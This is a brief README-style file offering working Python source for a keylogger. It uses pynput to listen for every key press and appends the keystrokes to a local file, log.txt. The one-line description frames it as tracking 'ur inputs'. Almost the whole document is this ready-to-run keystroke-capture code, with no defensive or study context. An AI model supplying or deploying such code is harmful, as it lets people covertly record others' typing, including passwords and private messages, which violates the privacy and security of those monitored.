# Keylogger
A keylogger to keep track of ur inputs.



from pynput.keyboard import Listener

def save_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    if letter=="Key.space":
        letter=" "
    if letter=="Key.enter":
        letter="\n"
    if letter=="Key.shift":
        letter=""
    with open("log.txt","a") as f:
        f.write(letter)

with Listener(on_press=save_file) as l:
    l.join()
